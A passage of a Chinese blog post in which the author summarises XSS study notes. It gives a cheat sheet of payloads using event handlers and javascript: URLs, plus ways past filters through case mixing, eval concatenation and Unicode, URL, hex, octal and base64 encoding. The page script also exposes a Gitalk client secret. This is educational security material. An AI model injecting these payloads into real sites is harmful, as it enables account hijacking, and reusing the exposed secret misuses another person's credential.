class="name">body</span></span></span><br><span class="line"><span class="tag"><span class="attr">onscroll</span>=<span class="string">alert(</span>"<span class="attr">xss</span>");&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">autofocus</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">textarea</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">textarea</span> <span class="attr">onfocus</span>=<span class="string">alert(</span>"<span class="attr">xss</span>"); <span class="attr">autofocus</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">keygen</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">keygen</span> <span class="attr">autofocus</span> <span class="attr">onfocus</span>=<span class="string">alert(1)</span>&gt;</span> //仅限火狐</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">marquee</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">marquee</span> <span class="attr">onstart</span>=<span class="string">alert(</span>"<span class="attr">xss</span>")&gt;</span><span class="tag">&lt;/<span class="name">marquee</span>&gt;</span> //Chrome不行，火狐和IE都可以</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">isindex</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">isindex</span> <span class="attr">type</span>=<span class="string">image</span> <span class="attr">src</span>=<span class="string">1</span> <span class="attr">onerror</span>=<span class="string">alert(</span>"<span class="attr">xss</span>")&gt;</span>//仅限于IE</span><br></pre></td></tr></table></figure>
+
+<h3 id="javascript伪协议"><a href="#javascript伪协议" class="headerlink" title="javascript伪协议"></a>javascript伪协议</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span>&gt;</span>标签</span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"javascript:alert(`xss`);"</span>&gt;</span>xss<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span>&gt;</span>标签</span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">javascript:alert(</span>'<span class="attr">xss</span>');&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span>&gt;</span>标签</span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">javascript:alert(</span>'<span class="attr">xss</span>')&gt;</span>//IE7以下</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span>&gt;</span>标签</span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"Javascript:alert(1)"</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">submit</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="有过滤"><a href="#有过滤" class="headerlink" title="有过滤"></a>有过滤</h3><p><strong>过滤空格</strong> ——》用<code>/</code>代替空格 ——》 <code>&lt;img/src=&quot;x&quot;/onerror=alert(1);&gt;</code></p>
+<p><strong>过滤关键字</strong> ——》 大小写混写or双写</p>
+<p><strong>过滤双引号，单引号</strong> ——》html标签中，我们可以不用引号。如果是在js中，我们可以用反引号代替单双引号</p>
+<p><strong>字符拼接</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">利用eval</span><br><span class="line"></span><br><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;a=`aler`;b=`t`;c=&apos;(`xss`);&apos;;eval(a+b+c)&quot;&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">利用top</span><br><span class="line"></span><br><span class="line">&lt;script&gt;top[&quot;al&quot;+&quot;ert&quot;](`xss`);&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="hidden-标签"><a href="#hidden-标签" class="headerlink" title="hidden 标签"></a>hidden 标签</h3><p><code>&lt;input type=&quot;hidden&quot; name=&quot;returnurl&quot; value=&quot;[你输入的东西]&quot; /&gt;</code></p>
+<p>在onclick事件下，使用accesskey ，所以<strong>需要与用户交互</strong>。</p>
+<p>payload<br><code>&lt;input type=&quot;hidden&quot; value=&quot;accesskey=&quot;X&quot; onclick=&quot;alert(1)&quot;/&gt;</code></p>
+<p>按Alt+SHIFT+X 键触发xss</p>
+<h3 id="编码绕过"><a href="#编码绕过" class="headerlink" title="编码绕过"></a>编码绕过</h3><p><strong>Unicode编码绕过</strong><br>可以使用在线编码：<a href="http://ctf.ssleye.com/cencode.html" target="_blank" rel="noopener">http://ctf.ssleye.com/cencode.html</a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#34;&amp;#120;&amp;#115;&amp;#115;&amp;#34;&amp;#41;&amp;#59;&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;eval(&apos;\u0061\u006c\u0065\u0072\u0074\u0028\u0022\u0078\u0073\u0073\u0022\u0029\u003b&apos;)&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<br>
+
+<p><strong>url编码绕过</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;eval(unescape(&apos;%61%6c%65%72%74%28%22%78%73%73%22%29%3b&apos;))&quot;&gt;</span><br><span class="line">&lt;iframe src=&quot;data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E&quot;&gt;&lt;/iframe&gt;</span><br></pre></td></tr></table></figure>
+
+<br>
+
+
+<p><strong>Ascii码绕过</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;eval(String.fromCharCode(97,108,101,114,116,40,34,120,115,115,34,41,59))&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<br>
+
+
+
+<p><strong>hex绕过</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=x onerror=eval(&apos;\x61\x6c\x65\x72\x74\x28\x27\x78\x73\x73\x27\x29&apos;)&gt;</span><br></pre></td></tr></table></figure>
+
+<br>
+
+
+<p><strong>八进制</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=x onerror=alert(&apos;\170\163\163&apos;)&gt;</span><br></pre></td></tr></table></figure>
+
+<br>
+
+
+<p><strong>base64绕过</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;eval(atob(&apos;ZG9jdW1lbnQubG9jYXRpb249J2h0dHA6Ly93d3cuYmFpZHUuY29tJw==&apos;))&quot;&gt;</span><br><span class="line">&lt;iframe src=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<h2 id="心得"><a href="#心得" class="headerlink" title="心得"></a>心得</h2><p>输入与输出，输入与输出，输入与输出。重要的事情说三遍，一定是有了输入和输出，才能造成XSS攻击！</p>
+<p>要有大量的测试，一定要有耐心</p>
+<p>在JS字符串里， <code>&lt;</code> 不光可以写为 <code>\u003c</code>，还可以写为<code>\x3c</code>， &gt; 同样可以写为<code>\x3e</code></p>
+<p>要看源码，看过滤的规则，以及前后文中涉及到的参数的处理，看是否能进行绕过</p>
+
+      
+    </div>
+
+    
+
+    
+    
+    
+
+    
+
+    
+      
+    
+    
+
+    
+      <div>
+        
+
+
+
+
+  
+
+
+
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>P2hm1n</li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    
+    <a href="https://p2hm1n.github.io/2019/07/21/那些年我们一起学XSS小结/" title="那些年我们一起学 XSS 小结">https://p2hm1n.github.io/2019/07/21/那些年我们一起学XSS小结/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fa fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！</li>
+</ul>
+
+      </div>
+    
+
+    <footer class="post-footer">
+      
+        
+          
+        
+        <div class="post-tags">
+          
+            <a href="/tags/Study/" rel="tag"># Study</a>
+          
+            <a href="/tags/XSS/" rel="tag"># XSS</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/07/21/Hydra使用教程/" rel="next" title="Hydra使用教程">
+                <i class="fa fa-chevron-left"></i> Hydra使用教程
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2019/07/22/cURL的广泛应用/" rel="prev" title="cURL的广泛应用">
+                cURL的广泛应用 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+  </div>
+
+
+          </div>
+          
+
+  
+    <div class="comments" id="gitalk-container">
+    </div>
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="/images/lufei.jpg" alt="P2hm1n">
+            
+              <p class="site-author-name" itemprop="name">P2hm1n</p>
+              <div class="site-description motion-element" itemprop="description">ONE PIECE</div>
+          </div>
+
+          
+            <nav class="site-state motion-element">
+              
+                <div class="site-state-item site-state-posts">
+                
+                  <a href="/archives/">
+                
+                    <span class="site-state-item-count">24</span>
+                    <span class="site-state-item-name">日志</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-categories">
+                  
+                    
+                      <a href="/categories/">
+                    
+                  
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">6</span>
+                    <span class="site-state-item-name">分类</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-tags">
+                  
+                    
+                      <a href="/tags/">
+                    
+                  
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">14</span>
+                    <span class="site-state-item-name">标签</span>
+                  </a>
+                </div>
+              
+            </nav>
+          
+
+          
+
+          
+
+          
+            <div class="links-of-author motion-element">
+              
+                <span class="links-of-author-item">
+                  
+                  
+                    
+                  
+                  
+                    
+                  
+                  <a href="https://github.com/P2hm1n" title="GitHub &rarr; https://github.com/P2hm1n" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
+                </span>
+              
+                <span class="links-of-author-item">
+                  
+                  
+                    
+                  
+                  
+                    
+                  
+                  <a href="/qq7832919@gmail.com" title="E-Mail &rarr; qq7832919@gmail.com"><i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+                </span>
+              
+                <span class="links-of-author-item">
+                  
+                  
+                    
+                  
+                  
+                    
+                  
+                  <a href="https://twitter.com/p2hm1n" title="Twitter &rarr; https://twitter.com/p2hm1n" rel="noopener" target="_blank"><i class="fa fa-fw fa-twitter"></i>Twitter</a>
+                </span>
+              
+            </div>
+          
+
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-block">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                Links
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.d0g3.cn/about?tdsourcetag=s_pctim_aiomsg#" title="https://www.d0g3.cn/about?tdsourcetag=s_pctim_aiomsg#" rel="noopener" target="_blank">D0g3 Family</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+            
+          
+          
+
+        </div>
+      </div>
+
+      
+      <!--noindex-->
+        <div class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+            
+            
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#那些年我们一起学XSS"><span class="nav-number">1.</span> <span class="nav-text">那些年我们一起学XSS</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#什么都没过滤的入门情况"><span class="nav-number">1.1.</span> <span class="nav-text">什么都没过滤的入门情况</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#输出在之间的情况"><span class="nav-number">1.2.</span> <span class="nav-text">输出在之间的情况</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#输出在HTML属性里的情况"><span class="nav-number">1.3.</span> <span class="nav-text">输出在HTML属性里的情况</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#宽字节复仇记"><span class="nav-number">1.4.</span> <span class="nav-text">宽字节复仇记</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#反斜线复仇记"><span class="nav-number">1.5.</span> <span class="nav-text">反斜线复仇记</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#换行符复仇记"><span class="nav-number">1.6.</span> <span class="nav-text">换行符复仇记</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#宽字节、反斜线与换行符一起复仇记"><span class="nav-number">1.7.</span> <span class="nav-text">宽字节、反斜线与换行符一起复仇记</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Dom-Xss入门-显式输出"><span class="nav-number">1.8.</span> <span class="nav-text">Dom Xss入门 [显式输出]</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Dom-Xss入门-隐式输出"><span class="nav-number">1.9.</span> <span class="nav-text">Dom Xss入门 [隐式输出]</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Dom-Xss进阶-邂逅eval"><span class="nav-number">1.10.</span> <span class="nav-text">Dom Xss进阶 [邂逅eval]</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Dom-Xss进阶-善变iframe"><span class="nav-number">1.11.</span> <span class="nav-text">Dom Xss进阶 [善变iframe]</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#存储型XSS入门-什么都没过滤的情况"><span class="nav-number">1.12.</span> <span class="nav-text">存储型XSS入门 [什么都没过滤的情况]</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Flash-XSS"><span class="nav-number">1.13.</span> <span class="nav-text">Flash XSS</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#小结"><span class="nav-number">2.</span> <span class="nav-text">小结</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#payload"><span class="nav-number">2.1.</span> <span class="nav-text">payload</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#无过滤"><span class="nav-number">2.1.1.</span> <span class="nav-text">无过滤</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#javascript伪协议"><span class="nav-number">2.1.2.</span> <span class="nav-text">javascript伪协议</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#有过滤"><span class="nav-number">2.1.3.</span> <span class="nav-text">有过滤</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#hidden-标签"><span class="nav-number">2.1.4.</span> <span class="nav-text">hidden 标签</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#编码绕过"><span class="nav-number">2.1.5.</span> <span class="nav-text">编码绕过</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#心得"><span class="nav-number">2.2.</span> <span class="nav-text">心得</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </div>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+  
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">P2hm1n</span>
+
+  
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"></i>
+    </span>
+    
+    <span title="站点总字数">228k</span>
+  
+
+  
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    
+    <span title="站点阅读时长">3:27</span>
+  
+</div>
+
+
+
+
+
+
+
+
+        
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+    
+
+    
+  </div>
+
+  
+
+<script>
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+  
+    
+    
+  
+  <script color="0,0,255" opacity="0.5" zindex="-1" count="99" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  <script src="/lib/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  
+  <script src="/lib/fancybox/source/jquery.fancybox.pack.js"></script>
+
+
+  
+
+
+  <script src="/js/utils.js?v=7.1.2"></script>
+
+  <script src="/js/motion.js?v=7.1.2"></script>
+
+
+
+  
+  
+
+
+  <script src="/js/schemes/muse.js?v=7.1.2"></script>
+
+
+
+
+  
+  <script src="/js/scrollspy.js?v=7.1.2"></script>
+<script src="/js/post-details.js?v=7.1.2"></script>
+
+
+
+  
+
+
+  <script src="/js/next-boot.js?v=7.1.2"></script>
+
+
+  
+
+  
+
+  
+
+  
+
+
+  
+    
+
+<script src="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script>
+
+
+
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.css">
+
+
+
+<script src="//cdn.jsdelivr.net/npm/js-md5@0.7.3/src/md5.min.js"></script>
+
+<script>
+  var gitalk = new Gitalk({
+    clientID: '355064866eb0a9c2de67',
+    clientSecret: '2e624255d41f832c93f2b3d8d828ecb1020eac9c',
+    repo: 'P2hm1n.github.io',
+    owner: 'P2hm1n',
+    admin: ['P2hm1n'],
+    id: md5(location.pathname),
+    
+      language: 'zh-CN',
+    
+    distractionFreeMode: 'true'
+  });
+  gitalk.render('gitalk-container');
+</script>
+
+  
+
+
+  
+  <script>
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url).replace(/\/{2,}/g, '/');
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
